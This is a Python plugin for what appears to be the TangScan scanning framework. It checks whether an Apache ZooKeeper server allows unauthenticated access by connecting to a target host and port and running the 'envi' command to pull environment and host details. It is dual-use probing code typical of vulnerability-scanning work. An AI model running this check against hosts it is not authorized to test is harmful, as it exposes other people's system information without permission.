#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
"""

from __future__ import print_function, absolute_import
from kazoo.client import KazooClient
from modules.exploit import TSExploit

__all__ = ['Tangscan']

class TangScan(TSExploit):
    def __init__(self):
        super(self.__class__, self).__init__()
        self.info = {
            "name": "zookeeper 未授权访问漏洞",
            "product": "zookeeper",
            "product_version": "all",
            "desc": """
                zookeeper 未授权访问, 可能导致敏感数据泄漏
            """,
            "license": self.license.TS,
            "author": "PyNerd",
            "ref": [
                {self.ref.url: ""}
            ],
            "type": self.type.misconfiguration,
            "severity": self.severity.medium,
            "privileged": False,
            "disclosure_date": "2010-01-01",
            "create_date": "2015-12-1"
        }

        self.register_option({
            "host": {
                "default": "",
                "required": True,
                "choices": [],
                "convert": self.convert.str_field,
                "desc": """
                    目标主机
                """
            },
            "port": {
                "default": 2181,
                "required": False,
                "choices": [],
                "convert": self.convert.int_field,
                "desc": """
                    目标端口
                """
            }
        })

        self.register_result({
            "status": False,
            "data": {
                "db_info": {
                    "db_name": ""
                }
            },
            "description": "",
            "error": "",
        })

    def verify(self):
        host = self.option.host
        port = self.option.port
        thost = host + ":" + str(port)
        try:
            conn = KazooClient(hosts =thost)
            conn.start()
            sysinfo = conn.command('envi')
        except Exception, e:
            self.result.error = "连接发生错误: {error}".format(error=str(e))
            return

        self.result.status = True
        self.result.result = str(sysinfo)
        self.result.description = "目标 {host} 的 zookeeper 可以未授权访问, 主机名信息: {sysinfo}".format(
            host=self.option.host,
            sysinfo=str(sysinfo)
        )

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    from modules.main import main
    main(TangScan())
